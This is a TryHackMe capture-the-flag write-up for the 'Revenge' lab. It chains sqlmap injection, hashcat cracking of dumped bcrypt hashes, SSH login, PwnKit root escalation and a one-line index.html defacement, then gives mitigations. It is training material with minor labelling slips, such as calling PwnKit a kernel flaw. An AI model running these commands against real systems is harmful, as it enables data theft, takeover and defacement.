# TryHackMe - Revenge Writeup

**Challenge:** https://tryhackme.com/room/revenge  
**Target IP:** 10.201.65.171  
**Vulnerable Application:** Rubber Ducky Inc. Web Application

---

## Overview

**Revenge** is a medium-difficulty TryHackMe challenge that focuses on web application exploitation, specifically SQL injection and privilege escalation. The attack chain involves network enumeration, web application discovery, SQL injection exploitation to extract database credentials, SSH access, and privilege escalation through kernel vulnerability exploitation.

This challenge demonstrates real-world web application security vulnerabilities and database exploitation techniques.

---

## I. Active Reconnaissance

### 1. Port Enumeration

Performed comprehensive port scan using Nmap:

```bash
nmap -A 10.201.65.171
```

**Results:**

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
80/tcp open  http    nginx 1.14.0 (Ubuntu)
```

**Key Findings:**
- SSH on standard port 22 (OpenSSH 7.6p1)
- HTTP web server on port 80 (nginx 1.14.0)
- OS: Linux 4.15 (98% confidence)
- Application: Rubber Ducky Inc. website
- Network distance: 6 hops

### 2. Service Analysis

| Port | Service | Version | Status |
|------|---------|---------|--------|
| 22 | SSH | OpenSSH 7.6p1 Ubuntu | Standard |
| 80 | HTTP | nginx 1.14.0 | Web application |

**Analysis:**
- Web server running nginx 1.14.0 on Ubuntu
- SSH service available for potential remote access
- Limited attack surface (only 2 services)
- Focus on web application enumeration

---

## II. Web Application Enumeration

### 1. Directory Enumeration

Used gobuster for directory discovery:

```bash
gobuster dir -u http://10.201.65.171 -w /usr/share/SecLists/Discovery/Web-Content/common.txt -t 150
```

**Discovered Endpoints:**

| Path | Status | Size | Type |
|------|--------|------|------|
| /admin | 200 | 4983 | Page |
| /contact | 200 | 6906 | Page |
| /index | 200 | 8541 | Home |
| /login | 200 | 4980 | Page |
| /products | 200 | 7254 | Page |
| /static | 301 | 194 | Directory |

**Key Finding:**
- `/products` endpoint identified as attack surface
- Web application appears to be e-commerce style
- Multiple user-facing pages discovered

### 2. Application Analysis

**Application Name:** Rubber Ducky Inc.  
**Technology Stack:**
- Frontend: HTML/CSS/JavaScript
- Backend: Web application (nginx)
- Database: MySQL (identified later)

---

## III. SQL Injection Discovery

### 1. Vulnerability Identification

Testing `/products/1` endpoint revealed **SQL injection vulnerability**:

```
GET /products/1
```

**Vulnerability Type:** SQL Injection  
**Location:** Product ID parameter  
**Injection Types Detected:**
- Boolean-based blind SQL injection
- Time-based blind SQL injection
- UNION query injection

### 2. Database Enumeration

Used sqlmap for automated SQL injection exploitation:

```bash
sqlmap -u "http://10.201.65.171/products/1" --dbs
```

**Database Information Extracted:**

**Backend DBMS:** MySQL >= 5.0.12

**Available Databases:**
1. duckyinc (target database)
2. information_schema
3. mysql
4. performance_schema
5. sys

### 3. Database Structure Enumeration

**Database: duckyinc**

**Table 1: user**

| Column | Type | Notes |
|--------|------|-------|
| id | Integer | Primary key |
| email | String | User email |
| company | String | Company name |
| username | String | Login username |
| _password | String | Bcrypt hash |
| credit_card | String | CC (exposed data) |

**Table 1 Data (10 entries):**

| ID | Username | Email | Company | Password Hash |
|----|----------|-------|---------|---|
| 1 | jhenry | sales@fakeinc.org | Fake Inc | $2a$12$dAV7fq4KIUyUEOALi8P2dOuXRj5ptOoeRtYLHS85vd/SBDv.tYXOa |
| 2 | smonroe | accountspayable@ecorp.org | Evil Corp | $2a$12$6KhFSANS9cF6riOw5C66nerchvkU9AHLVk7I8fKmBkh6P/rPGmanm |
| 3 | dross | accounts.payable@mcdoonalds.org | McDoonalds Inc | $2a$12$9VmMpa8FufYHT1KNvjB1HuQm9LF8EX.KkDwh9VRDb5hMk3eXNRC4C |
| 4 | ngross | sales@ABC.com | ABC Corp | $2a$12$LMWOgC37PCtG7BrcbZpddOGquZPyrRBo5XjQUIVVAlIKFHMysV9EO |
| 5 | jlawlor | sales@threebelow.com | Three Below | $2a$12$hEg5iGFZSsec643AOjV5zellkzprMQxgdh1grCW3SMG9qV9CKzyRu |
| 6 | mandrews | ap@krasco.org | Krasco Org | **thm{br3ak1ng_4nd_3nt3r1ng}** |
| 7 | dgorman | payable@wallyworld.com | Wally World Corp | $2a$12$8IlMgC9UoN0mUmdrS3b3KO0gLexfZ1WvA86San/YRODIbC8UGinNm |
| 8 | mbutts | payables@orlando.gov | Orlando City | $2a$12$dmdKBc/0yxD9h81ziGHW4e5cYhsAiU4nCADuN0tCE8PaEv51oHWbS |
| 9 | hmontana | sales@dollatwee.com | Dolla Twee | $2a$12$q6Ba.wuGpch1SnZvEJ1JDethQaMwUyTHkR0pNtyTW6anur.3.0cem |
| 10 | csmith | sales@ofamdollar | O! Fam Dollar | $2a$12$gxC7HlIWxMKTLGexTq8cn.nNnUaYKUpI91QaqQ/E29vtwlwyvXe36 |

**Flag 1 Location:** mandrews credit_card field contains the first flag

---

## IV. Credential Extraction

### 1. System User Table Discovery

**Table 2: system_user**

| ID | Username | Email | Password Hash |
|----|----------|-------|---|
| 1 | server-admin | sadmin@duckyinc.org | $2a$08$GPh7KZcK2kNIQEm5byBj1umCQ79xP.zQe19hPoG/w2GoebUtPfT8a |
| 2 | kmotley | kmotley@duckyinc.org | $2a$12$LEENY/LWOfyxyCBUlfX8Mu8viV9mGUse97L8x.4L66e9xwzzHfsQa |
| 3 | dhughes | dhughes@duckyinc.org | $2a$12$22xS/uDxuIsPqrRcxtVmi.GR2/xh0xITGdHuubRF4Iilg5ENAFlcK |

**Target:** server-admin account (system-level access potential)

### 2. Password Hash Cracking

Used hashcat to crack [bcrypt](https://hashcat.net/wiki/doku.php?id=example_hashes) hashes:

```bash
hashcat -m 3200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

**Cracking Result:**

```
Hash: $2a$08$GPh7KZcK2kNIQEm5byBj1umCQ79xP.zQe19hPoG/w2GoebUtPfT8a
Type: bcrypt (Algorithm 3200)
Plaintext: inuyasha
Time: ~47 seconds
Success Rate: 100%
```

**Credentials Obtained:**
- Username: server-admin
- Password: inuyasha

---

## V. Initial Access via SSH

### 1. SSH Authentication

Connected to target using extracted credentials:

```bash
ssh server-admin@10.201.65.171
Password: inuyasha
```

**Connection Result:** ✓ Successful

**Shell Access:**
```
server-admin@Vulnerable:~$
```

### 2. System Enumeration

**System Information:**
- Username: server-admin
- Home directory: /home/server-admin
- Shell: /bin/bash
- User ID: (non-root)

### 3. Flag Capture

Located flag in user's home directory:

```bash
cat /home/server-admin/flag.txt
flag{***flag2***}
```

**Flag 2:** Successfully captured

---

## VI. Privilege Escalation

### 1. Initial Assessment

**Sudo Privileges:**
```bash
sudo -l
[No sudoers configuration found]
```

**SUID Binaries:**
```bash
find / -user root -perm -u=s 2>/dev/null
[No exploitable SUID binaries found]
```

### 2. Kernel Vulnerability Research

Used linux-exploit-suggester for vulnerability detection:

```bash
./linux-exploit-suggester
```

**Tool Reference:** https://github.com/The-Z-Labs/linux-exploit-suggester

**Vulnerabilities Identified:**
1. **CVE-2021-4034** - PwnKit (Primary suggestion)
2. Other kernel vulnerabilities

### 3. CVE-2021-4034 (PwnKit) Exploitation

**Vulnerability Details:**
- **CVE ID:** CVE-2021-4034
- **Component:** pkexec (PolicyKit)
- **Type:** Privilege escalation
- **Impact:** Root access without authentication
- **Severity:** Critical

**Exploit Information:**
- **Exploit-DB ID:** 50689
- **URL:** https://www.exploit-db.com/exploits/50689
- **Language:** C
- **Requires:** Compilation

### 4. Exploit Execution

Used the Exploit-DB code for CVE-2021-4034 to escalate privileges:

**Exploit Source:** Exploit-DB 50689 (PwnKit)

**Exploitation Method:**
- Copied exploit code from Exploit-DB 50689
- Compiled the exploit code locally on target system
- Executed to trigger privilege escalation

**Execution Result:**

```bash
# whoami
root

# id
uid=0(root) gid=0(root) groups=0(root)
```

**Privilege Escalation:** ✓ Successful

---

## VII. Post-Exploitation & Website Defacement

### 1. Root Access Confirmation

Verified root privileges:

```bash
# pwd
/home/server-admin

# cat /etc/passwd | grep root
root:x:0:0:root:/root:/bin/bash
```

### 2. Root Flag Search

**Initial Check:**
```bash
ls -la /root/
flag.txt [not present]
```

**Flag Status:** Root flag not immediately available

### 3. Website Defacement

As part of the challenge, defaced the website:

**Target File:** `/var/www/duckyinc/templates/index.html`

**Defacement Command:**
```bash
echo 'you have been hacked!' > /var/www/duckyinc/templates/index.html
```

**Result:** Website compromised - index page replaced

### 4. Flag 3 Generation

After website defacement, Flag 3 was generated in root directory:

```bash
ls -la /root/
flag.txt [now present with Flag 3]
```

**Flag 3:** Successfully captured

---

## VIII. Attack Chain Summary

| Phase | Technique | MITRE ID | Description |
|-------|-----------|----------|-------------|
| Reconnaissance | Active Scanning | T1595 | Port and service enumeration |
| Reconnaissance | Scanning IP Blocks | T1595.001 | Nmap port scan |
| Reconnaissance | Vulnerability Scanning | T1595.002 | Service version detection |
| Reconnaissance | Gather Victim Info: Software | T1592.002 | Web server identification |
| Reconnaissance | Gather Victim Info: Client Config | T1592.004 | Web app framework discovery |
| Initial Access | Exploit Public-Facing Application | T1190 | SQL injection in web app |
| Lateral Movement | Remote Service Session Initiation | T1021.004 | SSH access with cracked creds |
| Privilege Escalation | Exploitation of Vulnerability | T1068 | CVE-2021-4034 PwnKit |

---

## IX. Key Vulnerabilities

### Vulnerability 1: SQL Injection

**Type:** Database Injection  
**Severity:** Critical (CVSS 9.8)  
**Location:** /products endpoint  
**Parameter:** Product ID  
**Impact:** Complete database compromise, credential exposure

**Details:**
- Boolean-based blind SQL injection
- Time-based blind SQL injection
- UNION query injection
- No input validation/sanitization
- Direct database queries without prepared statements

**Mitigation:**
- Use parameterized queries/prepared statements
- Input validation and sanitization
- Principle of least privilege for database user
- Web Application Firewall (WAF)
- Regular security audits

---

### Vulnerability 2: Weak Password Hashing Configuration

**Type:** Cryptographic Weakness  
**Severity:** High (CVSS 8.2)  
**Issue:** Bcrypt cost factor of 8 (server-admin user)

**Details:**
- Server-admin password hash: `$2a$08$...` (cost 8)
- Other user hashes: `$2a$12$...` (cost 12)
- Cost 8 allows faster password cracking
- Cracked in ~47 seconds

**Mitigation:**
- Use cost factor 12-13 minimum for bcrypt
- Regular rotation of critical credentials
- Strong password policies
- Hardware-accelerated hashing (Argon2)

---

### Vulnerability 3: Credential Storage Exposure

**Type:** Information Disclosure  
**Severity:** High (CVSS 8.0)  
**Issue:** Credit card data exposed in user table

**Details:**
- Credit card numbers stored in plaintext
- Accessible via SQL injection
- Multiple users' financial data exposed
- No encryption at rest

**Mitigation:**
- Never store full credit card numbers
- Use tokenization for payment processing
- Implement encryption at rest
- Apply PCI-DSS compliance standards
- Data masking for sensitive fields

---

### Vulnerability 4: Kernel Vulnerability (CVE-2021-4034)

**Type:** Privilege Escalation  
**Severity:** Critical (CVSS 7.8)  
**Vulnerability:** pkexec flaw allows unauthenticated privilege escalation

**Details:**
- Affects PolicyKit/pkexec
- No authentication required
- Allows unprivileged user to execute code as root
- Impacts system-wide security

**Mitigation:**
- Apply security patches immediately
- Update to patched PolicyKit version
- Monitor kernel vulnerabilities (CVE feeds)
- Implement application sandboxing
- Use principle of least privilege

---

## X. Defense & Mitigation Recommendations

### Immediate Actions (Priority 1 - Critical)

1. **Patch Systems**
   - Apply CVE-2021-4034 (PwnKit) patch
   - Update PolicyKit to latest version
   - Update kernel and all dependencies

2. **Database Security**
   - Implement parameterized queries
   - Update bcrypt cost factor to 13+
   - Remove plaintext credit card storage
   - Implement token-based payment processing

3. **Access Control**
   - Revoke compromised credentials immediately
   - Rotate all system passwords
   - Implement principle of least privilege for database user

4. **Incident Response**
   - Investigate database access logs
   - Audit all database queries executed
   - Check for data exfiltration
   - Notify affected users (credit card exposure)

### Medium-term Actions (Priority 2 - High)

5. **Web Application Hardening**
   - Implement Web Application Firewall (WAF)
   - Input validation and sanitization
   - Prepared statements for all database queries
   - Error handling without sensitive information disclosure

6. **Authentication & Encryption**
   - Implement multi-factor authentication
   - Enable SSH key-based authentication (disable passwords)
   - Use TLS/SSL for all connections
   - Encrypt sensitive data at rest

7. **Monitoring & Logging**
   - Enable comprehensive audit logging
   - Monitor database access patterns
   - Alert on suspicious SQL patterns
   - Log all privilege escalation attempts

8. **Database Hardening**
   - Restrict database user permissions
   - Disable unnecessary database features
   - Implement database activity monitoring
   - Regular security testing

### Long-term Actions (Priority 3 - Medium)

9. **Security Architecture**
   - Implement defense-in-depth strategy
   - Network segmentation
   - Zero-trust security model
   - Regular penetration testing

10. **Compliance & Governance**
    - PCI-DSS compliance (credit card data)
    - OWASP Top 10 remediation
    - Security awareness training
    - Incident response planning

11. **Secure Development**
    - Secure code review practices
    - Security testing in CI/CD pipeline
    - Dependency vulnerability scanning
    - Threat modeling for new features

---

## XI. Lessons Learned

1. **Input Validation Critical:** SQL injection remains a top vulnerability due to improper input handling
2. **Credential Security:** Even bcrypt can be weak with low cost factors; use 12-13 minimum
3. **Data Protection:** Never store sensitive data (credit cards) in plaintext
4. **Kernel Patches Essential:** Keep systems patched; CVE-2021-4034 was widely exploited
5. **Defense in Depth:** Single vulnerability (SQL injection) led to complete compromise
6. **Weak Configuration:** Single weak password hash enabled entire system compromise
7. **Multiple Entry Points:** Web vulnerability led to system access, then privilege escalation

---

## XII. Tools & Techniques Used

| Tool | Purpose | Command |
|------|---------|---------|
| Nmap | Port and service enumeration | `nmap -A 10.201.65.171` |
| gobuster | Web directory enumeration | `gobuster dir -u http://10.201.65.171 -w wordlist.txt` |
| sqlmap | SQL injection exploitation | `sqlmap -u "http://target/products/1" --dbs` |
| hashcat | Password hash cracking | `hashcat -m 3200 -a 0 hash.txt rockyou.txt` |
| SSH | Remote shell access | `ssh server-admin@10.201.65.171` |
| linux-exploit-suggester | Kernel vulnerability detection | `./linux-exploit-suggester` |
| gcc | Exploit compilation | `gcc -o pwnkit exploit.c` |

---

## XIII. References

- **MITRE ATT&CK Framework:** https://attack.mitre.org/
- **CVE-2021-4034 (PwnKit):** https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-4034
- **Exploit-DB 50689:** https://www.exploit-db.com/exploits/50689
- **OWASP Top 10:** https://owasp.org/www-project-top-ten/
- **SQL Injection Prevention:** https://owasp.org/www-community/attacks/SQL_Injection
- **Bcrypt Best Practices:** https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html
- **linux-exploit-suggester:** https://github.com/The-Z-Labs/linux-exploit-suggester

---

## XIV. Timeline

| Phase | Activity | Result |
|-------|----------|--------|
| Reconnaissance | Port scanning | 2 open ports identified |
| Enumeration | Directory discovery | 6 web endpoints found |
| Vulnerability Assessment | SQL injection testing | Vulnerability confirmed |
| Database Exploitation | sqlmap enumeration | 5 databases and 2 tables dumped |
| Credential Extraction | Database table analysis | Flag 1 and system credentials found |
| Password Cracking | Hashcat bcrypt cracking | server-admin:inuyasha obtained |
| Initial Access | SSH authentication | User shell achieved |
| Flag Capture | User directory search | Flag 2 captured |
| Privilege Escalation | PwnKit exploitation | Root access obtained |
| Post-Exploitation | Website defacement | Index.html modified |
| Flag Generation | Defacement trigger | Flag 3 generated in /root |

---

## Summary

Revenge is a well-designed challenge that demonstrates critical web application vulnerabilities and their exploitation. The challenge highlights:

- **Web Application Security:** SQL injection remains highly dangerous when input validation is missing
- **Credential Security:** Weak password hashing enables rapid credential compromise
- **System Hardening:** Unpatched systems are vulnerable to known exploits
- **Data Protection:** Sensitive data must be encrypted and properly protected

The attack chain shows how a single SQL injection vulnerability can cascade into complete system compromise when combined with weak credentials and unpatched systems. This underscores the importance of defense-in-depth and proper security hardening.

**Key Takeaway:** Fix the root cause (SQL injection) rather than treating symptoms. Proper input validation would have prevented the entire attack chain.

---
